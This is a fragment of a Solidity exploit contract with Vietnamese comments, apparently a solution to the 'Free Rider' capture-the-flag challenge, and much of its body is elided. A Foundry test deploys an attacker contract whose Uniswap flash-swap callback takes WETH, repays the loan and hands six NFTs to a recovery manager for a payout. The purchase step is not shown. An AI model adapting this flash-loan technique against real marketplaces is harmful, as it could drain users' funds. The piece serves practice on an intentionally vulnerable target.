...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        MyContract myContract = new MyContract(weth, uniswapPair, marketplace, nft, recoveryManager);
        myContract.trigger();
    }
...
contract MyContract{
    ...
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        ...
        // Chuyen WETH sang ETH
        weth.withdraw(NFT_PRICE);

        // Mang buy ids chua ID cua 6 NFT
        ...
        // Hoan tra khoan vay
        uint amountRepay = (NFT_PRICE * 1004) / 1000; // Phi 0.3%
        weth.deposit{value: amountRepay}(); // Chuyen ETH sang WETH
        weth.transfer(address(uniswapPair), amountRepay);

        // Chuyen NFT toi recovery
        bytes memory data = abi.encode(player);
        for (uint256 i = 0; i < 6; i++){
            nft.approve(address(recoveryManager), ids[i]);
            nft.safeTransferFrom(address(this), address(recoveryManager), ids[i], data);
        }
    }

    // Nhan NFT qua onERC721Received
